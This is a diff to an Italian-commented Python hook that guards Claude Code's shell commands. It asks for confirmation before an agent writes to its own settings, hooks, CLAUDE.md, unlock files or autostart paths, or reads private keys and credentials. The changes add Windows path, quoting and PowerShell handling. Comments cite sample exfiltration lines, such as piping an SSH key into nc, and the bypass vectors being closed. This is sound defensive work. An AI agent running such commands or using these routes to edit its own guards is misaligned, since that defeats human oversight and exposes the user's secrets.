@@ -122,7 +122,7 @@ _CFG_SUFFIX_RE = re.compile(
 )
 # Operatori di scrittura shell. Il match testuale del path assoluto è il caso base;
 # _writes_config() sotto copre anche il target RELATIVO dopo un `cd ~/.claude/...`.
-_CFG_ABS = r"[^\s'\";|&]*\.claude/(?:settings[^/\s'\"]*\.json|hooks/|\.claude\.json)"
+_CFG_ABS = r"[^\s;|&]*?\.claude/(?:settings[^/\s'\"]*\.json|hooks/|\.claude\.json)"
 # cp, mv, install, rsync e ln non stanno qui: li giudica _writes_config, che sa quale
 # argomento è la destinazione. Nel testo `cp ~/.claude/settings.json /tmp/x` sembrava una
 # scrittura, e copiare la config altrove è una lettura (9/9/2026, nella config dell'autore).
@@ -139,14 +139,14 @@ CONFIG_WRITE_RE = re.compile(
 # (l'unlock della sessione le fa passare tutte), qui si copre il vettore shell (>, sed -i, cp, tee...),
 # che altrimenti lo riscrive senza prompt.
 CLAUDE_MD_WRITE_RE = re.compile(
-    r"(?:>>?\s*[^\s'\";|&]*CLAUDE(?:\.local)?\.md\b"
+    r"(?:>>?\s*[^\s;|&]*?CLAUDE(?:\.local)?\.md\b"
     r"|\bsed\b[^|;&]*-i[^|;&]*CLAUDE(?:\.local)?\.md\b)"
 )
 # open() di python in scrittura su un CLAUDE.md: chiede sempre, prima di CLAUDE_MD_WRITE_RE (1/11/2026).
 CLAUDE_MD_OPEN_RE = re.compile(r"open\(\s*['\"][^'\"]*CLAUDE(?:\.local)?\.md['\"]\s*,\s*['\"][wax+]")
 # Percorsi di avvio automatico (git hook, LaunchAgents, systemd utente, autostart):
 # via Edit/Write li protegge protect_claude_md.py con un unlock, qui il vettore shell.
-_PERSIST_ABS = (r"[^\s'\";|&]*(?:\.git/hooks/[^\s'\";|&]+|Library/LaunchAgents/[^\s'\";|&]+"
+_PERSIST_ABS = (r"[^\s;|&]*?(?:\.git/hooks/[^\s'\";|&]+|Library/LaunchAgents/[^\s'\";|&]+"
                 r"|\.config/(?:systemd/user|autostart)/[^\s'\";|&]+)")
 # Qui solo redirezione e open(): cp, tee, sed -i e gli altri binari li giudica
 # _writes_config, che sa quale argomento è la destinazione (copiare un hook
@@ -162,7 +162,7 @@ _WRITE_BINS = frozenset("tee cp mv install rsync ln dd truncate touch".split())
 # Solo la CREAZIONE del file (redirezione, touch, tee, open in scrittura) e solo direttamente
 # in ~/.claude, dove protect_claude_md.py lo cerca. Leggere una nota che ha "unlock" nel nome
 # non sblocca niente (8/9/2026, nella config dell'autore). cp, mv e ln: _writes_config(_is_unlock).
-_UNLOCK_ABS = r"[^\s'\";|&]*\.claude/[^\s'\";|&/]*unlock[^\s'\";|&/]*(?=[\s'\";|&)]|$)"
+_UNLOCK_ABS = r"[^\s;|&]*?\.claude/[^\s'\";|&/]*unlock[^\s'\";|&/]*(?=[\s'\";|&)]|$)"
 UNLOCK_RE = re.compile(
     r"(?:>>?\s*|\b(?:touch|tee)\b[^|;&]*)" + _UNLOCK_ABS +
     r"|open\(\s*['\"][^'\"]*\.claude/[^'\"/]*unlock[^'\"/]*['\"]\s*,\s*['\"][wax]",
@@ -223,7 +223,7 @@ _SKIP_WRAPPERS = frozenset(("sudo", "command", "nohup", "caffeinate", "timeout",
 # `< file` o `$(< file)` con file segreto: esfiltrazione via redirezione (es.
 # `nc host 443 < ~/.ssh/id_ed25519`, `echo "$(<~/.ssh/id_ed25519)"`).
 _SECRET_REDIR_RE = re.compile(
-    r"(?:<\s*|\$\(\s*<\s*)[^\s'\";|&)]*"
+    r"(?:<\s*|\$\(\s*<\s*)[^\s;|&)]*?"
     r"(\.ssh/(?!(?:config|known_hosts(?:\.old)?|authorized_keys)(?![\w.-])|[^\s'\"/]*\.pub(?![\w.-]))|"
     r"id_(rsa|ed25519|ecdsa|dsa)\b(?!\.pub\b)|\.aws/(?!config(?![\w.-]))|\.gnupg/|"
     r"\.git-credentials|\.pem|credentials\.json|\.pypirc|secrets\.env|\.secrets/|"
@@ -289,6 +289,7 @@ def _cmd_subst_bodies(command: str):
 
 def _reads_secret(command: str) -> bool:
     cmd = _testo_shell(command).replace("\\\n", " ")  # prima gli heredoc: una \ nel corpo è testo
+    cmd = _barre(cmd)  # su Windows `C:\Users\x\.ssh\id_ed25519` (#5096)
     for src in [cmd] + _cmd_subst_bodies(cmd):
         if _reads_secret_flat(src):
             return True
@@ -669,11 +670,14 @@ def _log_di_job(p):
 def _is_protected_tree(p):
     if not p:
         return False
-    h = _home()
-    claude = os.path.normpath(os.path.join(h, ".claude"))
-    base = _projects_base()
     if _log_di_job(p):
         return False
+    # Su macOS e Windows il disco ignora le maiuscole: `rm -rf ~/.CLAUDE` cancella la config, e su Windows
+    # Git Bash scrive `/c/users/...` (review del 9/11/2026, #5096).
+    p = _piega(p)
+    h = _piega(os.path.normpath(_home()))
+    claude = _piega(os.path.normpath(os.path.join(_home(), ".claude")))
+    base = _piega(_projects_base())
     if p == claude or p.startswith(claude + os.sep):
         return True
     if p == base:
@@ -726,6 +730,19 @@ def _piega(p):
     return p.casefold() if p and sys.platform in ("darwin", "win32") else p
 
 
+_BARRA_ROVESCIATA = re.compile(r"\\(?=[\w.~-])")
+
+
+def _barre(testo, sempre=False):
+    """Il testo con le barre dritte al posto di quelle rovesciate dei percorsi, solo su Windows (o con
+    `sempre`, per il codice di cmd e powershell): le regex dei percorsi vogliono `/`, e
+    `"C:\\Users\\x\\.ssh\\id_ed25519"` passava senza conferma (review del 9/11/2026, #5096). Restano
+    `\\"`, `\\\\`, `\\$` e `\\|`, che per la shell non sono percorsi."""
+    if not testo or not (sempre or os.name == "nt"):
+        return testo
+    return _BARRA_ROVESCIATA.sub("/", testo)
+
+
 def _is_persistenza(p):
     """True se il path reale è un git hook o un file di avvio automatico."""
     if not p:
@@ -776,6 +793,117 @@ def _is_unlock(p):
             and os.path.dirname(p) == os.path.normpath(os.path.join(_home(), ".claude")))
 
 
+def _segmenti_virgolette(testo):
+    """I comandi semplici del testo: spezza su `;`, a capo, `&&`, `||`, `|` e `&` solo fuori dalle
+    virgolette, con le regole di backslash di bash. `>|`, `2>&1`, `&>` e `|&` non spezzano. Prima
+    `re.split` tagliava anche dentro le virgolette, e `echo "a;b" > "<config>"` perdeva il bersaglio
+    (review del 9/11/2026, #5096)."""
+    out, corrente, i, n, q = [], [], 0, len(testo), None
+    while i < n:
+        c = testo[i]
+        if q == "'":
+            q = None if c == "'" else q
+        elif c == "\\" and i + 1 < n:
+            corrente.append(testo[i:i + 2])
+            i += 2
+            continue
+        elif q == '"':
+            q = None if c == '"' else q
+        elif c in "'\"":
+            q = c
+        elif c in ";\n" or (c in "&|" and testo[i + 1:i + 2] == c):
+            out.append("".join(corrente))
+            corrente = []
+            i += 1 if c in ";\n" else 2
+            continue
+        elif c == "|" and testo[i - 1:i] != ">":
+            out.append("".join(corrente))
+            corrente = []
+            i += 2 if testo[i + 1:i + 2] == "&" else 1
+            continue
+        elif c == "&" and testo[i - 1:i] not in (">", "<") and testo[i + 1:i + 2] != ">":
+            out.append("".join(corrente))
+            corrente = []
+            i += 1
+            continue
+        corrente.append(c)
+        i += 1
+    out.append("".join(corrente))
+    return [s for s in out if s.strip()]
+
+
+_FINE_PAROLA = frozenset(" \t\r\n;&|<>()")
+
+
+def _parola_shell(seg, i):
+    """(parola, indice dopo) dalla posizione i: pezzi senza virgolette, '...' letterale e "..." con le
+    regole di bash, anche concatenati (`"$HOME"/.claude/x`). Le variabili restano scritte."""
+    parti, n = [], len(seg)
+    while i < n and seg[i] not in _FINE_PAROLA:
+        c = seg[i]
+        if c == "'":
+            j = seg.find("'", i + 1)
+            j = n if j < 0 else j
+            parti.append(seg[i + 1:j])
+            i = j + 1
+        elif c == '"':
+            i += 1
+            while i < n and seg[i] != '"':
+                if seg[i] == "\\" and i + 1 < n and seg[i + 1] in '$`"\\\n':
+                    parti.append(seg[i + 1])
+                    i += 2
+                    continue
+                parti.append(seg[i])
+                i += 1
+            i += 1
+        elif c == "\\" and i + 1 < n:
+            parti.append(seg[i + 1])
+            i += 2
+        else:
+            parti.append(c)
+            i += 1
+    return "".join(parti), i
+
+
+def _bersagli_redirezione(seg):
+    """I file scritti dalle redirezioni del segmento: `>`, `>>`, `>|`, `N>`, `&>`, `&>>`, con il bersaglio
+    anche fra virgolette. `>&N`, `>&-` e `>(...)` non scrivono un file. Prima la regex si fermava alla
+    virgoletta, e `echo x > "$HOME/.claude/settings.json"` passava senza conferma (#5096)."""
+    out, i, n, q = [], 0, len(seg), None
+    while i < n:
+        c = seg[i]
+        if q == "'":
+            q = None if c == "'" else q
+            i += 1
+            continue
+        if c == "\\" and i + 1 < n:
+            i += 2
+            continue
+        if q == '"':
+            q = None if c == '"' else q
+            i += 1
+            continue
+        if c in "'\"":
+            q = c
+            i += 1
+            continue
+        if c != ">":
+            i += 1
+            continue
+        i += 1
+        if seg[i:i + 1] in (">", "|"):
+            i += 1
+        if seg[i:i + 1] == "&" or seg[i:i + 1] == "(":
+            i += 1
+            continue
+        while i < n and seg[i] in " \t":
+            i += 1
+        parola, i = _parola_shell(seg, i)
+        if parola:
+            out.append(parola)
+    return out
+
+
 def _writes_config(command, cwd, protetto=None, sed=True, cancella=False):
     """Copre `cd ~/.claude/hooks && > file` (target relativo dopo un cd): il match
     testuale di CONFIG_WRITE_RE vede solo i path assoluti che contengono `.claude/`.
@@ -786,7 +914,7 @@ def _writes_config(command, cwd, protetto=None, sed=True, cancella=False):
     scrive come sed -i."""
     protetto = protetto or _under_claude_config
     cwd_decl = None
-    for seg in re.split(r"&&|\|\||;|\||\n", command):
+    for seg in _segmenti_virgolette(command):
         seg = seg.strip()
         if not seg:
             continue
@@ -810,9 +938,8 @@ def _writes_config(command, cwd, protetto=None, sed=True, cancella=False):
                 output = toks[index + 1]
             if output and protetto(_resolve(output, base_cwd)):
                 return True
-        # redirect > / >> verso un target
-        m = re.search(r">>?\s*([^\s'\";|&]+)", seg)
-        if m and protetto(_resolve(m.group(1), base_cwd)):
+        # redirezioni verso un file, anche fra virgolette
+        if any(protetto(_resolve(b, base_cwd)) for b in _bersagli_redirezione(seg)):
             return True
         # binario di scrittura con un target come argomento
         toks = _dopo_involucri(toks) or toks
@@ -1584,25 +1711,29 @@ _PS_CODIFICATO = re.compile(r"^[-/]e(?:n(?:c(?:o(?:d(?:e(?:d(?:c(?:o(?:m(?:m(?:a
                             re.IGNORECASE)
 
 
-def _powershell_rimuove(args):
-    """I bersagli di ogni Remove-Item ricorsivo nel codice di `powershell -Command`: una lista per
-    istruzione, None se arrivano da una pipe o non si leggono."""
-    codice = None
+def _codice_powershell(args):
+    """Il codice che `powershell` o `pwsh` esegue: dopo -Command, decodificato da -EncodedCommand, o gli
+    argomenti liberi. None con -File: lo script sta in un file."""
     for i, a in enumerate(args):
         if _PS_COMANDO.match(a):
-            codice = " ".join(args[i + 1:])
-            break
+            return " ".join(args[i + 1:])
         if _PS_CODIFICATO.match(a) and i + 1 < len(args):
             try:
                 import base64
-                codice = base64.b64decode(args[i + 1]).decode("utf-16-le")
+                return base64.b64decode(args[i + 1]).decode("utf-16-le")
             except Exception:
-                codice = ""
-            break
+                return ""
         if a.lower() in ("-file", "/file", "-f"):
-            return []
+            return None
+    return " ".join(a for a in args if not a.startswith("-"))
+
+
+def _powershell_rimuove(args):
+    """I bersagli di ogni Remove-Item ricorsivo nel codice di `powershell -Command`: una lista per
+    istruzione, None se arrivano da una pipe o non si leggono."""
+    codice = _codice_powershell(args)
     if codice is None:
-        codice = " ".join(a for a in args if not a.startswith("-"))
+        return []
     out = []
     for istruzione in re.split(r"[;\n]", codice):
         stadi = istruzione.split("|")
@@ -1612,6 +1743,52 @@ def _powershell_rimuove(args):
                 bersagli = [p for p in parole[1:] if not p.startswith("-")]
                 out.append(bersagli if bersagli and k == 0 else None)
     return out
+
+
+# cmd e powershell (review del 9/11/2026, #5096): il loro codice è un argomento, e le regole per programma
+# non lo leggevano. `cmd //c type <chiave>` e `powershell Set-Content <config>` passavano senza conferma.
+_WIN_SCRIVE = re.compile(
+    r"(?:^|[\s;|&(])(?:set-content|add-content|out-file|tee-object|new-item|copy-item|move-item|remove-item|"
+    r"rename-item|clear-content|sc|ac|ni|cpi|copy|cp|mi|move|mv|ri|del|erase|rm|rni|ren|rename|xcopy|robocopy|"
+    r"mklink)(?=[\s(]|$)|>|\[(?:system\.)?io\.file\]::(?:write|append|copy|move|delete|create|replace)",
+    re.IGNORECASE)
+_WIN_PROTETTI = (
+    ("sblocco", re.compile(r"\.claude/[^/\s'\";|&]*unlock", re.IGNORECASE)),
+    ("config", re.compile(r"\.claude/(?:settings[^/\s'\"]*\.json|hooks(?![\w.-])|firme(?![\w.-])|plugins/(?:cache|marketplaces)"
+                          r"|\.claude\.json|bin/aggiorna(?:menti\.py|-applica\.sh)|arturo/(?:radice|rilasci\.allowed_signers"
+                          r"|[^/\s'\"]*\.local))", re.IGNORECASE)),
+    ("claude-md", re.compile(r"CLAUDE(?:\.local)?\.md\b", re.IGNORECASE)),
+    ("avvio-automatico", re.compile(r"\.git/hooks(?![\w.-])|Library/LaunchAgents/|\.config/(?:systemd/user|autostart)/",
+                                    re.IGNORECASE)),
+)
+
+
+def _codici_windows(testo):
+    """Il codice di ogni `cmd /c` e `powershell -Command` del comando, con le barre dritte."""
+    out = []
+    for nome, args in _fc.programmi(testo):
+        basso = nome.lower()[:-4] if nome.lower().endswith(".exe") else nome.lower()
+        if basso == "cmd" and args and args[0].lower() in ("/c", "//c", "/k", "//k"):
+            out.append(_barre(" ".join(args[1:]), sempre=True))
+        elif basso in ("powershell", "pwsh"):
+            codice = _codice_powershell(args)
+            if codice:
+                out.append(_barre(codice, sempre=True))
+    return out
+
+
+def _regole_windows(testo):
+    """Le regole che il codice di cmd e powershell tocca: segreto se nomina un file segreto, e la regola del
+    percorso (config, sblocco, claude-md, avvio-automatico) se scrive e nomina un percorso protetto."""
+    regole = set()
+    for codice in _codici_windows(testo):
+        if SECRET_PATH_RE.search(codice) or _SECRET_DIR_RE.search(codice) or ENV_RE.search(codice):
+            regole.add("segreto")
+        if _WIN_SCRIVE.search(codice):
+            for regola, pattern in _WIN_PROTETTI:
+                if pattern.search(codice):
+                    regole.add(regola)
+    return regole
 
 
 _PUSH_RISCRIVE = ("--force", "--force-with-lease", "--force-if-includes", "--mirror", "--delete", "--prune")
@@ -1826,8 +2003,16 @@ def main() -> int:
             )
             return 2
 
+    # Su Windows le regex dei percorsi leggono il testo con le barre dritte, e il codice di cmd e powershell
+    # ha le sue regole (review del 9/11/2026, #5096).
+    dritto = _barre(testo)
+    try:
+        windows = _regole_windows(testo)
+    except Exception:
+        windows = set()
+
     # 2) Scrittura shell su config/hook di Claude Code -> ask (auto-modifica guardie)
-    if CONFIG_WRITE_RE.search(testo) or _writes_config(testo, cwd, cancella=True):
+    if CONFIG_WRITE_RE.search(dritto) or "config" in windows or _writes_config(testo, cwd, cancella=True):
         return _ask("config",
             "Scrittura via shell su settings/hook di Claude Code o sull'aggiornamento automatico "
             "di Arturo: modificherebbe le guardie stesse, o cosa si installa da solo. Conferma "
@@ -1852,7 +2037,8 @@ def main() -> int:
     progetto = _writes_config(testo, cwd, lambda p: _is_claude_md(p) and not _globale(p) and os.path.exists(p))
     risolto = _writes_config(testo, cwd, lambda p: _is_claude_md(p) and not _globale(p))
     if globale or progetto_nuovo or (progetto and not _claude_md_progetto_libero()) or \
-            CLAUDE_MD_OPEN_RE.search(testo) or (CLAUDE_MD_WRITE_RE.search(testo) and not risolto):
+            CLAUDE_MD_OPEN_RE.search(dritto) or "claude-md" in windows or \
+            (CLAUDE_MD_WRITE_RE.search(dritto) and not risolto):
         return _ask("claude-md",
             "Scrittura via shell su un CLAUDE.md: cambierebbe le istruzioni di ogni sessione "
             "futura in quella cartella. Conferma solo se sei tu a volerlo. Per una modifica sola "
@@ -1860,7 +2046,7 @@ def main() -> int:
         )
 
     # 2a-bis) Scrittura shell su un percorso di avvio automatico -> ask (persistenza)
-    if PERSIST_WRITE_RE.search(testo) or _writes_config(testo, cwd, _is_persistenza):
+    if PERSIST_WRITE_RE.search(dritto) or "avvio-automatico" in windows or _writes_config(testo, cwd, _is_persistenza):
         return _ask("avvio-automatico",
             "Scrittura via shell su un git hook o su un servizio di avvio automatico "
             "(LaunchAgents, systemd, autostart): il codice partirebbe da solo a ogni "
@@ -1868,7 +2054,7 @@ def main() -> int:
         )
 
     # 2b) Creazione di un file di unlock -> ask (sbloccherebbe l'auto-modifica)
-    sblocco = UNLOCK_RE.search(testo) or _writes_config(testo, cwd, _is_unlock)
+    sblocco = UNLOCK_RE.search(dritto) or "sblocco" in windows or _writes_config(testo, cwd, _is_unlock)
     if sblocco and "claude-md-unlock" in testo and "config-unlock" not in testo:
         return _ask("sblocco-claude-md",
             "Sblocco della modifica di CLAUDE.md per questa sessione: Claude potrà "
@@ -1881,7 +2067,7 @@ def main() -> int:
         )
 
     # 3) Lettura di file segreti via shell -> ask (per-segmento, alta precisione)
-    if _reads_secret(command):
+    if _reads_secret(command) or "segreto" in windows:
         return _ask("segreto",
             "Lettura di un file segreto via shell (chiave privata, credenziali, "
             "~/.ssh, ~/.aws...). Conferma solo se serve davvero: il contenuto "
